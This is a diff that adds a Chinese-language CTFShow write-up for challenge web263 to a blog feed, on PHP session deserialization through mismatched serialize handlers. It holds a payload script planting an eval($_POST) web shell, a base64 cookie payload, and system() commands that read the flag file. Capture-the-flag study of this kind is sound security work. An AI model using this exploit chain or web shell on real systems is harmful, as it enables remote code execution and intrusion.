@@ -1034,9 +1034,86 @@
 </ul>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxMzU6ImxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVSI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7fSI7czo1OiJ0b2tlbiI7czo0OiJ1c2VyIjt9</span><br></pre></td></tr></table></figure>
 
-<h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>源码: <a href="http://www.zip/">www.zip</a> 文件泄露(index.php, check.php, inc.php)。</p>
+<p><strong>分析:</strong></p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li>从 三目运算符 可得到: __ SESSION 可控，通过 __ COOKIE[‘limit’] 可控。</li>
+</ul>
+<p>inc.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 inc.php中 可以看到 session_start() 开启了 session会话。</li>
+<li>class User{} 中 file_put_contents() 文件写入，利用点。</li>
+<li>file_put_contents() 中的文件名: log-xxx.php 。</li>
+<li>ini_set(‘session.serialize_handler’, ‘php’); 其中 session.serialize_handler： session序列化存储所用处理器。默认 php。还有其它处理器如下:</li>
+<li>实例代码便于观看各种处理器之间的格式:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&quot;admin&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">处理器</th>
+<th>序列化格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">session.serialize_handler=php</td>
+<td>user|s:5:”admin”;</td>
+</tr>
+<tr>
+<td align="center">session.serialize_handler=php_serialize</td>
+<td>a:1:{s:4:”user”;s:5:”admin”;}</td>
+</tr>
+<tr>
+<td align="center">session.serialize_handler=php_binary</td>
+<td>users:5:”admin”; （:二进制数据）</td>
+</tr>
+</tbody></table>
+<ul>
+<li>session反序列化所使用的引擎和序列化使用的引擎不一样，将导致数据无法正确反序列化。因此就可以钻空子了，我们通过手段来达到我们的目的。具体的话，我是个小白，解释不清。</li>
+</ul>
+<p>check.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>= <span class="variable">$db</span>-&gt;get(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">	[	<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">	],[</span><br><span class="line">		<span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line">		<span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line">		<span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] <span class="comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span></span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">		<span class="comment">//登陆成功取消次数累计</span></span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//登陆失败累计次数加1</span></span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;  </span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p>payload.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1])?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$a</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyMzoiPD9waHAgZXZhbCgkX1BPU1RbMV0pPz4iO3M6Njoic3RhdHVzIjtOO30=</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>更改 index.php中 cookie:</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_1.png"></p>
+<ul>
+<li>然后刷新 index.php 页面</li>
+<li>访问 check.php， 会显示 登陆失败的 unicode编码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/check.php?u=<span class="number">111</span>&amp;pass=<span class="number">111</span> <span class="comment">// u&amp;pass 随便写</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_2.png"></p>
+<ul>
+<li>尝试访问 log-1.php </li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/log-<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_3.png"></p>
+<ul>
+<li>如图所示 Notice 证明 log-1.php写入成功。</li>
+<li>post 传参</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>=system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="number">1</span>=system(<span class="string">&#x27;tac flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_4.png"></p>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web263_5.png"></p>
+<ul>
+<li>成功拿到 flag。</li>
+</ul>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
